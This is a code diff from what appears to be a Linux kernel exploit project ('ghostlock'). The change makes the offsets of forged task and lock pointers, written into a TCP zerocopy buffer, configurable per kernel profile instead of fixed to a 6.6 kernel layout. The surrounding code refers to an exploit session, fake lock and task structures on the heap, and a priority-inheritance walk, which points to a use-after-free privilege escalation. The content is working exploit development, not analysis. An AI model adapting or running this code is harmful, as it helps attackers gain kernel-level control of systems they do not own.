@@ -268,13 +268,21 @@ namespace ghostlock::route::tcp_zerocopy {
         uint32_t post_hold =
                 profile.tcp_post_receive_hold_iterations();
         uint32_t attempts = profile.tcp_attempts();
+        /* zc→stale-waiter word offsets. 0 keeps the baked 6.6 geometry
+         * (0x28/0x30, Δ=8); a profile value shifts the overlay to match
+         * this kernel's syscall frame depths. */
+        uint32_t task_word = profile.tcp_task_word();
+        uint32_t lock_word = profile.tcp_lock_word();
+        if (!task_word) task_word = 0x28;
+        if (!lock_word) lock_word = 0x30;
 
         pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
-                "fake_task=%016zx task=%016zx attempts=%u arm=%u hold=%u\n",
+                "fake_task=%016zx task=%016zx attempts=%u arm=%u hold=%u "
+                "task_word=%u lock_word=%u\n",
                 (session::g_exploit_session.heap.current.base), (session::g_exploit_session.heap.current.fake_lock),
                 (session::g_exploit_session.heap.current.fake_w0), (session::g_exploit_session.heap.current.fake_task),
                 waiter_task,
-                attempts, arm_seq, post_hold);
+                attempts, arm_seq, post_hold, task_word, lock_word);
 
         punch_go.store(1);
         /* custom-write mode: fire the PI walk immediately */
@@ -315,8 +323,8 @@ namespace ghostlock::route::tcp_zerocopy {
                                                      mapping.data()) + page_size));
             support::put32(zc.data(), 0x20,
                            static_cast<uint32_t>(sendbuf.size()));
-            support::put64(zc.data(), 0x28, waiter_task);
-            support::put64(zc.data(), 0x30, (session::g_exploit_session.heap.current.fake_lock));
+            support::put64(zc.data(), task_word, waiter_task);
+            support::put64(zc.data(), lock_word, (session::g_exploit_session.heap.current.fake_lock));
 
             socklen_t len = static_cast<socklen_t>(zc.size());
             errno = 0;
